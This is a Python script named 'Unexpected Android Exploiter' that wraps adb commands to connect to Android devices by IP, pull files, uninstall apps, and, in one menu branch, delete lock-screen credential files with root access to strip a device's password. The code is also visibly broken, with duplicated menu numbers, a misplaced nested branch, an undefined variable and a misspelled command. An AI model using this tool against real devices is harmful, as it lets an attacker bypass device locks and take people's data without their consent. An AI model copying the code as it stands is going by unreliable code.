# Created by Rayan25062011


import sys
import time as t
import os
import threading
import platform
WHSL = '\033[0m'
ENDL = '\033[0m'
REDL = '\033[0;31m'
GNSL = '\033[0;32m'
GREEN = '\033[1;32;40m'

arrow = REDL + "└──>" + WHSL
connect = REDL + "│" + WHSL


def loadproject():
    print(f"[{GNSL}INFO{ENDL}] Loading project...")
    t.sleep(1.8)
    print(f"[{GNSL}+{ENDL}] Project succesfully loaded")
    t.sleep(0.8)
loadproject.daemon = True


def main():

    print("""
                     {0}[{1}Unexpected{0}]{2}
                     {0}({1}Unexpected Android Exploiter{0}){2}
                     {2}Developed by Rayan25062011{2}


    ,--. ,--.                                               ,--.            ,--. 
    |  | |  |,--,--,  ,---. ,--.  ,--. ,---.  ,---.  ,---.,-'  '-. ,---.  ,-|  | 
    |  | |  ||      \| .-. : \  `'  / | .-. || .-. :| .--''-.  .-'| .-. :' .-. | 
    '  '-'  '|  ||  |\   --. /  /.  \ | '-' '\   --.\ `--.  |  |  \   --.\ `-' | 
     `-----' `--''--' `----''--'  '--'|  |-'  `----' `---'  `--'   `----' `---'  
                                  `--'                                                                                                                                                    
                                                                                                                                                                                                                                                                                       

    {0}[{1}1{0}] {2}Show connected devices      {0}[{1}8{0}] {2}Get network status
    {0}[{1}2{0}] {2}Disconect all devices       {0}[{1}9{0}] {2}Get battery status
    {0}[{1}3{0}] {2}Connect a new device        {0}[{1}10{0}] {2}Uninstall an app
    {0}[{1}4{0}] {2}Access device shell         {0}[{1}11{0}] {2}Exit 'Unexpected'
    {0}[{1}5{0}] {2}Pull files from device      {0}[{1}12{0}] {2}Update 'Unexpected'
    {0}[{1}6{0}] {2}Shutdown device             {0}[{1}13{0}] {2}About us
    {0}[{1}7{0}] {2}Show all device apps        {0}[{1}14{0}] {2}Report a bug   
    {0}[{1}15{0}] {2}Dump System Info           {0}[{1}99{0}] {2}Make your own!
    {0}[{1}6{0}] {2}Turn WiFi on/off
    {0}[{1}7{0}] {2}Remove device password
 """.format(GNSL, REDL, WHSL))
    option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")
    if option == '3':
        print(("\n{1}[{0}+{1}]{2} Enter a device IP address.").format(REDL, GNSL, WHSL))
        try:
            device_name = input (arrow+" Unexpected"+GNSL+"("+REDL + "connect_device" + GNSL + ")"+ENDL + "> ")
        except KeyboardInterrupt:
            main()
        if device_name == '':
            main()
        if device_name == '27':
            main()     
        os.system("adb connect "+device_name+":5555")
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")


    elif option  ==  '2':
        try:
            device_name
        except:
            print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
            main()
        os.system("adb disconnect")
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")



    elif option == '7':
        try:
            device_name
        except:
            print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
            main()
        os.system("adb -s "+device_name+ " reboot ")
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")


    elif option == '4':
        print(("{1}[{0}+{1}]{2} Restarting Unexpected Server...{3}").format(REDL, GNSL, WHSL, ENDL))
        os.system("adb disconnect >> /dev/null")
        os.system("adb kill-server >> /dev/null")
        os.system("adb start-server >> /dev/null")
        t.sleep(4)
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")


    elif option == '15':
        try:
            device_name
        except:
            print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
            main()
        os.system("adb -s "+device_name+" shell dumpsys")
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")


    elif option == '6':
        try:
            device_name
        except:
            print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
            main()
        print(("     "+connect))
        print(REDL + "****************** REMOVING PASSWORD ******************")
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/gesture.key'")
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db'")
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-wal'")
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-shm'")
        print(REDL + "****************** REMOVING PASSWORD ******************")
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")


        if option == '5':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Enter a file location on a device.").format(REDL, GNSL, WHSL))
            file_location = input("    "+arrow + " Unexpected"+GNSL+"("+REDL + "file_pull" + GNSL + ")"+ENDL + "> ")
            print(("        "+connect))
            print(("       {1}[{0}+{1}]{2} Enter where you would like to save the file.").format(REDL, GNSL, WHSL))
            place_location = input("       "+arrow + " Unexpected"+GNSL+"("+REDL + "file_pull" + GNSL + ")"+ENDL + "> ")
            
            w = os.environ['OLDPWD']
            os.chdir(w)

            os.system("adb -s "+device_name+" pull "+file_location+" "+place_location)
 
            os.chdir(g)

            option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")


    elif option == '6':
        try:
            device_name
        except:
            print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
            main()
        print(("     "+connect))
        print(("    {1}[{0}+{1}]{2} To turn WiFi back on, you should the device to be Pluged-In.").format(REDL, GNSL, WHSL))
        print(("     "+connect))
        on_off = input(GNSL + "    ["+REDL+"+"+GNSL+"]"+WHSL+" Would you like to turn the WiFi on/off")
        if on_off == 'off':
            command = " shell svc wifi disable"
        else:
            command = " shell svc wifi enable"

        os.system("adb -s "+device_name+command)
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")


    if option == '1':
        try:
            device_name
        except:
            print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
            main()
        os.system("adb devices -l")
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")


    if option == '7':
        try:
            device_name
        except:
            print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
            main()
        os.system("adb -s " +device_name+ " shell pm list packages -f")
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")

    if option == '8':
        try:
            device_name
        except:
            print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
            main()
        os.system("adb -s " +device_name+ " shell netstat")
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")


    if option == '9':
        try:
            device_name
        except:
            print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
            main()
        os.system("adb -s " +device_name+ " shell dumpsys battery")
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")


    if option ==  '10':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Enter a package name.").format(REDL, GNSL, WHSL))
            package_name = input("    "+arrow + "Unexpected"+GNSL+"("+REDL + "app_delete" + GNSL + ")"+ENDL + "> ")
            os.system("adb -s "+device_name+" unistall "+package_name)
            option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")

    if option == '11':
        print(f"{REDL}Thank you{ENDL} for using {GREEN}Unexpected!{ENDL}")
        sys.exit()


    if option == '12':
        os.system("chmod +x etc/update.sh && etc/update.sh")
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")


    if option == '13':
        print(REDL+"Hello"+ENDL+"\nI am a python developer, i make these softwares\nto help penetration testers\n"+REDL+"Goodbye!"+ENDL)
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")


    if option == '':
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")


    if option == ' ':
        sys.exit()
 

    if option == '' > 3:
        sys.exit()


    if option == '14':
        print(f"[{REDL}-{ENDL}] Please wait till this project is posted on {GREEN}Github{ENDL}")
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")


    if option == '99':
        print(f"{REDL}You need{ENDL} to use {GNSL}'adb'{ENDL} ex: {GREEN}'adb -s (target IP) shell dumpsys'{ENDL} to dump target info.")
        adbCMD = input("{REDL}Command{ENDL} {GNSL}>{ENDL} ")
        os.system(adbCMD)

    else:
        print("Unexpected: error: invalid command")
        option = input(ENDL + "Unexpected"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")




if __name__=='__main__':
    loadproject()
    main()